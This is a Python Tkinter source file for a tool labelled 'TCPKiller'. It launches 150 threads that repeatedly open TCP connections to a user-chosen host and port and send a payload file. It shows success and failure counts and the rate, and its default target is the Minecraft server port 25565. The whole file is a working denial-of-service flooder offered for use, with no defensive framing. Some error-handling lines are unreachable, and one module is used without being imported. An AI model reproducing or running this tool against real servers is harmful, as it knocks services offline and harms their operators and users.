#coding=utf-8
import socket
import threading
import time
import sys
from tkinter import *

socket.setdefaulttimeout(5.0) #timeout
shouldq=1
xs=15 #x-size
ys=10 #y-size
ver='2.0' #version
inited=False
okt=0
failt=0

def initt():
    global inited,host,port,content
    inited=True
    host=hostvar.get()
    port=portvar.get()
    try:
        f=open('content.txt','br')
        content=f.read()
        f.close()
    except:
        content=''
    setup.destroy()

def k(y,x):
    global shouldq,okt,failt
    sta[y][x]['text']='＝＝'
    try:
        while shouldq==0:
            try:
                s=socket.socket()
                s.connect((host,port))
                s.send(content)
                s.close()
            except:
                raise
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                failt+=1
                sta[y][x]['text']='！！'
                time.sleep(1)
                sta[y][x]['text']='＝＝'
            else:
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                okt+=1
                if sta[y][x]['text']=='－－':
                    sta[y][x]['text']='＋＋'
                else:
                    sta[y][x]['text']='－－'
        sta[y][x]['text']='　　'
        return
    except:
        return

def st():
    global shouldq
    shouldq=0
    if threading.activeCount()>3:
        messagebox.showwarning('TCPKiller',
                               str(threading.activeCount()-3)+'个线程已在运行')
    for y in range(ys):
        for x in range(xs):
            t=threading.Thread(target=k,args=(y,x))
            t.setDaemon(True)
            t.start()
def kill():
    global shouldq
    shouldq=1

def test():
    try:
        s=socket.socket()
        s.connect((host,port))
        s.send(content)
        d=str(s.recv(512))+'…'
        s.close()
    except (OSError,ConnectionRefusedError,TimeoutError) as e:
        messagebox.showwarning('TCPKiller',str(e)+'\n'+host+':'+str(port))
    except:
        messagebox.showerror('TCPKiller','未知错误')
        raise
    else:
        messagebox.showinfo('TCPKiller','测试成功\n'+host+':'+str(port)+'\n'+d)

def init():
    global hostvar,portvar,setup
    setup=Tk()
    
    hostvar=StringVar() #target-hostname
    hostvar.set('127.0.0.1')
    portvar=IntVar() #target-port
    portvar.set(25565)

    ipselect=Entry(setup,textvariable=hostvar)
    portselect=Entry(setup,textvariable=portvar)
    setupdone=Button(setup,text='完成',command=initt)

    setup.title('神通')
    setup.resizable(False,False)
    Label(setup,text='主机').grid(row=0,column=0)
    ipselect.grid(row=0,column=1)
    Label(setup,text='端口').grid(row=1,column=0)
    portselect.grid(row=1,column=1)
    setupdone.grid(row=2,column=0,columnspan=2)
    mainloop()

def stats(callback):
    cached=0
    try:
        while 1:
            if shouldq==0:
                callback.title('成功%s  失败%s  速率%s'%(okt,failt,okt-cached))
            else:
                callback.title('神通 '+ver)
            cached=okt
            time.sleep(1)
    except:
        return

init()
global tk
tk=Tk()
if not inited:
    tk.destroy()
    sys.exit(-1)

sta=[[0 for col in range(xs)] for row in range(ys)]

for y in range(ys):
    for x in range(xs):
        sta[y][x]=Button(tk,text='　　',relief=SUNKEN)
        sta[y][x].grid(column=x,row=y)

bs=Button(tk,text='开始',command=st)
bs.grid(column=xs+1,row=0)
bk=Button(tk,text='停止',command=kill)
bk.grid(column=xs+1,row=1)
bk=Button(tk,text='测试',command=test)
bk.grid(column=xs+1,row=2)

tk.resizable(False,False)
tk.title('神通 '+ver)
t=threading.Thread(target=stats,args=(tk,))
t.setDaemon(True)
t.start()

mainloop()
kill()
